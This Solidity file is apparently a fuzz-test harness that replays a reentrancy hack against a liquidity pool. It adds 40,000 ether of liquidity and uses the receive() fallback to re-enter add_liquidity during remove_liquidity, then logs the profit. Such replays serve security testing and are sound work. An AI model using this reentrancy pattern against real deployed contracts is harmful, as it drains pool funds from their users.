// SPDX-License-Identifier: MIT
import {FuzzSetup} from "./FuzzSetup.sol";

contract Fuzz is FuzzSetup {
    bool performReentrancy = false;

    constructor() payable FuzzSetup() {}

    function replayHack() public {
        uint256 balance = address(this).balance;
        log("initial balance", balance);

        uint256[2] memory amount;
        amount[0] = 40_000 ether;
        amount[1] = 0;
        pool.add_liquidity{value: 40_000 ether}(amount, 0);
        log("balance after add liquidity", address(this).balance);

        performReentrancy = true;
        amount[0] = 0;
        pool.remove_liquidity(pool.balanceOf(address(this)), amount);
        performReentrancy = false;
        log("balance after remove liquidity #1", address(this).balance);

        pool.remove_liquidity(10_272 ether, amount);
        log("balance after remove liquidity #2", address(this).balance);

        log("final balance", address(this).balance);
        log("profit", address(this).balance - balance);

        t(false, "done");
    }

    receive() external payable {
        if (performReentrancy) {
            uint256[2] memory amount;
            amount[0] = 40_000 ether;
            amount[1] = 0;
            pool.add_liquidity{value: 40_000 ether}(amount, 0);

            log(
                "balance after add liquidity (reentrancy)",
                address(this).balance
            );
        }
    }
}
